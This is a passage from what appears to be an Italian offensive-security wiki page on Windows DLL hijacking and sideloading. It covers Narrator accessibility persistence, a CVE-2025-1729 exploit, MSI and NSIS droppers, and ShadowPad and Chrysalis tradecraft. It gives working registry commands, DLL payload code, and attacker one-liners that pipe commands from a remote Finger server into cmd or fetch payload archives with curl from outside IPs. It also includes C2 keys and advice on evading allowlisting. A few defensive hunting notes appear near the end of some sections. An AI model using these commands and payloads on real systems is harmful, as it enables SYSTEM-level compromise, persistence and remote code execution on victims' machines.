- Un hijack ingenuo parlerà/evidenzierà l'interfaccia. Per rimanere silenziosi, al collegamento enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e sospendilo con `SuspendThread`; continua nel tuo thread. Consulta il PoC per il codice completo.<sup>[[8]](#references)</sup>

Trigger e persistenza tramite la configurazione di Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, l'avvio di Narrator carica la DLL piantata. Nel secure desktop (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM nel secure desktop.

Esecuzione SYSTEM attivata tramite RDP (movimento laterale)
- Consenti il classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti via RDP all'host; nella schermata di accesso premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM nel secure desktop.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa: esegui rapidamente inject/migrate.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di uno strumento Accessibility (AT) integrato (ad esempio, CursorIndicator), modificarla in modo che punti a un binario/DLL arbitrario, importarla e quindi impostare `configuration` sul nome di quell'AT. In questo modo viene eseguita una proxy sotto il framework Accessibility.

Note
- La scrittura in `%windir%\System32` e la modifica dei valori HKLM richiedono diritti di amministratore.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra il **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguito ogni giorno alle 9:30 sotto il contesto dell'utente che ha effettuato l'accesso.
- **Directory Permissions**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
- **Comportamento di ricerca delle DLL**: tenta innanzitutto di caricare `hostfxr.dll` dalla propria working directory e registra "NAME NOT FOUND" se manca, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub `hostfxr.dll` malevolo nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione del codice sotto il contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso dell'attacco

1. Come utente standard, copia `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi l'esecuzione del task pianificato alle 9:30 sotto il contesto dell'utente corrente.
3. Se un amministratore ha effettuato l'accesso quando il task viene eseguito, la DLL malevola viene eseguita nella sessione dell'amministratore con medium integrity.
4. Combina tecniche standard di UAC bypass per elevare i privilegi da medium integrity ai privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading tramite Signed Host (wsc_proxy.exe)

Gli threat actors associano spesso dropper basati su MSI al DLL side-loading per eseguire payload all'interno di un processo attendibile e firmato.<sup>[[10]](#references)</sup>

Panoramica della catena
- L'utente scarica un MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (ad esempio, un'azione LaunchApplication o VBScript), ricostruendo lo stage successivo a partire dalle risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllato dall'attacker).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla working directory, eseguendo il codice dell'attacker sotto un processo parent firmato (ATT&CK T1574.001).

Analisi dell'MSI (cosa cercare)
- Tabella CustomAction:
- Cerca voci che eseguono file eseguibili o VBScript. Pattern sospetto di esempio: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), esamina CustomAction, InstallExecuteSequence e Binary tables.
- Payload incorporati/divisi nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usa lessmsi: lessmsi x package.msi C:\out
- Cerca più frammenti di piccole dimensioni che vengono concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Inserisci questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo e firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria directory.
- wsc.dll: DLL dell'attaccante. Se non sono richiesti export specifici, può essere sufficiente DllMain; altrimenti, crea una proxy DLL e inoltra gli export richiesti alla libreria autentica, eseguendo il payload in DllMain.
- Crea un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di esportazione, usa un proxying framework (ad es. DLLirant/Spartacus) per generare una forwarding DLL che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome della DLL da parte del binario host. Se l'host usa percorsi assoluti o flag di safe loading (ad es. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack potrebbe non riuscire.
- KnownDLLs, SxS e gli export inoltrati possono influenzare la precedenza e devono essere considerati durante la selezione del binario host e dell'export set.

## Triadi firmate + payload cifrati (case study ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi con software legittimo mantenendo il payload principale cifrato su disco:<sup>[[12]](#references)</sup>

1. **EXE host firmato** – vengono abusati vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attacker rinominano l'eseguibile per farlo sembrare un binario Windows (ad esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **DLL loader malevola** – viene rilasciata accanto all'EXE con un nome previsto (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è individuare il blob cifrato, decifrarlo e mappare ShadowPad tramite reflection.
3. **Blob payload cifrato** – spesso viene memorizzato come `<name>.tmp` nella stessa directory. Dopo aver eseguito il memory-mapping del payload decifrato, il loader elimina il file TMP per distruggere le prove forensi.

Note di tradecraft:

* Rinominare l'EXE firmato (mantenendo l'`OriginalFileName` originale nell'header PE) consente di farlo passare per un binario Windows mantenendo al contempo la firma del vendor; replica quindi l'abitudine di Ink Dragon di rilasciare binari simili a `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l'eseguibile rimane trusted, la maggior parte dei controlli di allowlisting deve solo consentire la presenza della tua DLL malevola accanto a esso. Concentrati sulla personalizzazione della loader DLL; il parent firmato può generalmente essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia writable, così da poter azzerare il file dopo il mapping. Mantieni la directory writable fino al caricamento del payload; una volta in memoria, il file TMP può essere eliminato in sicurezza per l'OPSEC.

### Stager LOLBAS + catena di sideloading di un archivio staged (finger → tar/curl → WMI)

Gli operatori combinano il DLL sideloading con LOLBAS, così l'unico artefatto custom su disco è la DLL malevola accanto all'EXE trusted:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera i comandi da un server Finger e li inoltra a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera testo via TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di ruotare il server del secondo stage lato server.

- **Download/estrazione integrati:** scarica un archivio con un'estensione innocua, decomprimilo e prepara il target del sideloading più la DLL in una cartella `%LocalAppData%` casuale:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde l'avanzamento e segue i redirect; `tar -xf` usa il tar integrato di Windows.

- **Avvio WMI/CIM:** avvia l'EXE tramite WMI, così la telemetria mostra un processo creato da CIM mentre carica la DLL colocated:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binari che preferiscono le DLL locali (ad es. `intelbq.exe`, `nearby_share.exe`); il payload (ad es. Remcos) viene eseguito sotto il nome trusted.

- **Hunting:** genera un alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è una combinazione poco comune al di fuori degli script di amministrazione.


## Case Study: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una recente intrusione di Lotus Blossom ha abusato di una catena di aggiornamento trusted per distribuire un dropper impacchettato con NSIS che preparava un DLL sideloading più payload completamente in-memory.<sup>[[13]](#references)</sup>

Flusso di tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo contrassegna come **HIDDEN**, rilascia un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob cifrato `BluetoothService`, quindi avvia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob tramite mmap; `LogWrite` lo decifra con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in plaintext, libera i temporanei e vi esegue un jump.
- Per evitare una IAT, il loader risolve le API tramite hashing dei nomi degli export usando la base FNV-1a 0x811C9DC5 + il prime 0x100019, quindi applicando un avalanche in stile Murmur (**0x85EBCA6B**) e confrontando il risultato con hash target salted.

Main shellcode (Chrysalis)
- Decifra un modulo principale simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` per cinque passaggi, quindi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce le stringhe dei nomi delle DLL a runtime tramite trasformazioni bit-rotate/XOR per carattere, quindi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre il **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Embedded configuration & C2
- La configurazione si trova all'interno del file `BluetoothService` rilasciato, all'**offset 0x30808** (dimensione **0x980**) e viene decifrata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL del C2 e lo User-Agent.
- I beacon costruiscono un host profile delimitato da punti, antepongono il tag `4Q`, quindi cifrano con RC4 usando la chiave `vAuig34%^325hGV` prima di `HttpSendRequestA` tramite HTTPS. Le risposte vengono decifrate con RC4 e gestite da uno switch sui tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` enumerazione di drive/file + casi di trasferimento chunked).
- La modalità di esecuzione è controllata dagli argomenti CLI: nessun argomento = installa la persistenza (service/Run key) puntando a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l'installazione ed esegue il payload.

Alternate loader osservato
- La stessa intrusion ha rilasciato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il codice sorgente C fornito dall'attacker incorporava shellcode, che veniva compilato ed eseguito in-memory senza scrivere un PE su disco. Replica con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase di compile-and-run basata su TCC importava `Wininet.dll` a runtime e recuperava una shellcode di secondo stadio da un URL hardcoded, fornendo un loader flessibile che si maschera da esecuzione del compilatore.

## Signed-host sideloading with export proxying + host thread parking

Alcune catene di DLL sideloading aggiungono **stability engineering** affinché l'host legittimo rimanga attivo abbastanza a lungo da caricare correttamente gli stadi successivi, invece di andare in crash dopo il caricamento della DLL malevola.<sup>[[11]](#references)</sup>

Pattern osservato
- Copiare un EXE trusted accanto a una DLL malevola usando il nome della dipendenza previsto, come `version.dll`.
- La DLL malevola fa da **proxy per ogni export previsto** verso la DLL di sistema reale (ad esempio `%SystemRoot%\\System32\\version.dll`), in modo che la risoluzione degli import abbia successo e il processo host continui a funzionare.
- Dopo il caricamento, la DLL malevola **patcha l'entry point dell'host** affinché il thread principale entri in un loop infinito di `Sleep` invece di terminare o eseguire percorsi di codice che causerebbero la chiusura del processo.
- Un nuovo thread esegue il lavoro malevolo effettivo: decrittografare il nome o il percorso della DLL di stadio successivo (RC4/XOR sono comuni), quindi avviarla con `LoadLibrary`.

Perché è importante
- Il normale DLL proxying preserva la compatibilità delle API, ma non garantisce che l'host rimanga attivo abbastanza a lungo per gli stadi successivi.
- Mettere il thread principale in pausa con `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo firmato mentre il loader esegue la decrittografia, lo staging o il bootstrap di rete in un worker thread.
- Cercare soltanto una `DllMain` sospetta può far perdere questo pattern se il comportamento interessante si verifica dopo il patch dell'entry point dell'host e l'avvio di un thread secondario.

Workflow minimo
1. Copiare l'EXE host firmato e determinare la DLL che risolve dalla directory locale.
2. Creare una DLL proxy che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, creare un worker thread.
4. Da quel thread, patchare l'entry point dell'host o la routine di avvio del thread principale in modo che esegua un loop su `Sleep`.
5. Decrittografare il nome/la configurazione della DLL di stadio successivo e chiamare `LoadLibrary` oppure eseguire il manual mapping del payload.

Punti di osservazione difensivi
- Processi firmati che caricano `version.dll` o librerie altrettanto comuni dalla propria directory applicativa invece che da `System32`.
- Patch in memoria all'entry point del processo poco dopo il caricamento dell'immagine, in particolare jump/call reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una DLL proxy che chiamano immediatamente `LoadLibrary` su una seconda DLL con un nome decrittografato.
- DLL proxy con tutti gli export, posizionate accanto agli eseguibili dei vendor all'interno di directory di staging scrivibili come `ProgramData`, `%TEMP%` o percorsi di archivi decompressi.

## References

- [1] [Red Canary – Approfondimenti di intelligence: gennaio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
